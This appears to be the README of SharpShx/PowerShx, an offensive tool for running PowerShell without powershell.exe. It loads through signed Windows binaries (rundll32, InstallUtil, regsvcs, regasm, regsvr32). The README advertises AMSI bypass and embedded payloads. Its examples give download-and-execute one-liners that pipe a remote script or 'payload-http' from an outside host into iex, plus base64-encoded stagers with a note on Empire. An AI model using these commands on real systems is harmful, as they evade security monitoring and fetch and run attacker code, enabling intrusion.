<div align="center">
    <h1>SharpShx</h1>
    <br/>
</div>

Unmanaged PowerShell execution using DLLs or a standalone executable.

## Introduction
PowerShx is a rewrite and expansion on the [PowerShdll](https://github.com/p3nt4/PowerShdll) project. PowerShx provide functionalities for bypassing AMSI and running PS Cmdlets.


### Features
- Run Powershell with DLLs using rundll32.exe, installutil.exe, regsvcs.exe or regasm.exe, regsvr32.exe.
- Run Powershell without powershell.exe or powershell_ise.exe
- AMSI Bypass features.
- Run Powershell scripts directly from the command line or Powershell files
- Import Powershell modules and execute Powershell Cmdlets.


## Usage

### .dll version
#### rundll32
```
rundll32 PowerShx.dll,main -e                           <PS script to run>
rundll32 PowerShx.dll,main -f <path>                    Run the script passed as argument
rundll32 PowerShx.dll,main -f <path> -c <PS Cmdlet>     Load a script and run a PS cmdlet
rundll32 PowerShx.dll,main -w                           Start an interactive console in a new window
rundll32 PowerShx.dll,main -i                           Start an interactive console
rundll32 PowerShx.dll,main -s                           Attempt to bypass AMSI
rundll32 PowerShx.dll,main -v                           Print Execution Output to the console
```

#### Alternatives (Credit to SubTee for these techniques):
```
1. 
    x86 - C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U PowerShx.dll
    x64 - C:\Windows\Microsoft.NET\Framework64\v4.0.3031964\InstallUtil.exe /logfile= /LogToConsole=false /U PowerShx.dll
2. 
    x86 C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe PowerShx.dll
    x64 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe PowerShx.dll
3. 
    x86 C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U PowerShx.dll
    x64 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U PowerShx.dll
4. 
    regsvr32 /s  /u PowerShx.dll -->Calls DllUnregisterServer
    regsvr32 /s PowerShx.dll --> Calls DllRegisterServer
```

### .exe version
```
PowerShx.exe -i                          Start an interactive console
PowerShx.exe -e                          <PS script to run>
PowerShx.exe -f <path>                   Run the script passed as argument
PowerShx.exe -f <path> -c <PS Cmdlet>    Load a script and run a PS cmdlet
PowerShx.exe -s                          Attempt to bypass AMSI.
```

## Embedded payloads
Payloads can be embedded by updating the data dictionary "Common.Payloads.PayloadDict" in the "Common" project and calling it in the method PsSession.cs -> Handle() . 
Example: in Handle() method:

```
private void Handle(Options options)
{
  // Pre-execution before user script
  _ps.Exe(Payloads.PayloadDict["amsi"]);
}
```


## Examples
#### Run a base64 encoded script
```
rundll32 PowerShx.dll,main [System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String("BASE64")) ^| iex

PowerShx.exe -e [System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String("BASE64")) ^| iex
```
Note: Empire stagers need to be decoded using [System.Text.Encoding]::Unicode


#### Run a base64 encoded script
```
rundll32 PowerShx.dll,main . { iwr -useb https://website.com/Script.ps1 } ^| iex;

PowerShx.exe -e "IEX ((new-object net.webclient).downloadstring('http://192.168.100/payload-http'))"
```

## Requirements
.NET 4


## Known Issues
Some errors do not seem to show in the output. May be confusing as commands such as Import-Module do not output an error on failure.
Make sure you have typed your commands correctly.

In dll mode, interractive mode and command output rely on hijacking the parent process' console. If the parent process does not have a console, use the -n switch to not show output otherwise the application will crash.

Due to the way Rundll32 handles arguments, using several space characters between switches and arguments may cause issues. Multiple spaces inside the scripts are okay.

